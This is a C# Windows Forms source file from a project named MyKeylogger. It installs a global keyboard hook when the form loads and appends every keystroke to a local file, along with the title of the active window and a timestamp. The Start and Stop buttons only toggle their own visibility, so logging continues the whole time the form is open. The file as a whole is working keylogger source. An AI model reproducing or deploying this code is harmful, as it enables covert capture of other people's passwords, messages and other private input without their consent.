using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using MyKeylogger.Lib;
using MyKeylogger.Lib.WinApi;


namespace MyKeylogger
{
    public partial class Form1 : Form
    {

        private readonly KeyboardHookListener keylisener;
        private IntPtr lastActiveWindow = IntPtr.Zero;
        private bool hasSubmitted;
        private readonly KeyMapper keyMapper = new KeyMapper();
        private string Filepath => Functions.Fullpath;

        public Form1()
        {
            InitializeComponent();

            keylisener = new KeyboardHookListener(new GlobalHooker());

            Functions.CreateFile();

            keylisener.KeyDown += Keylisener_KeyDown;

        }

        private void Keylisener_KeyDown(object sender, KeyEventArgs e)
        {
            if (lastActiveWindow != Functions.GetForegroundWindow())
            {
                string format = @"[""{0}""{1}]" + Environment.NewLine + Environment.NewLine;

                string text = string.Format(format, Functions.GetActiveWindowsText(), DateTime.Now);

                if (hasSubmitted)
                {
                    text = text.Insert(0, Environment.NewLine + Environment.NewLine);
                }

                File.AppendAllText(Filepath, text);

                hasSubmitted = true;

                lastActiveWindow = Functions.GetForegroundWindow();
            }
            string keyText = keyMapper.GetKeyText(e.KeyCode);

            File.AppendAllText(Filepath, keyText);
        }
        protected override void OnLoad(EventArgs e)
        {
            base.OnLoad(e);

            keylisener.Enabled = true;
        }
        protected override void OnFormClosing(FormClosingEventArgs e)
        {
            base.OnFormClosing(e);

            keylisener.Enabled = false;
        }



        private void BtnStart_Click(object sender, EventArgs e)
        {
            BtnStop.Visible = true;
            BtnStart.Visible = false;
        }

        private void BtnStop_Click(object sender, EventArgs e)
        {
            BtnStop.Visible = false;
            BtnStart.Visible = true;
        }
    }
}
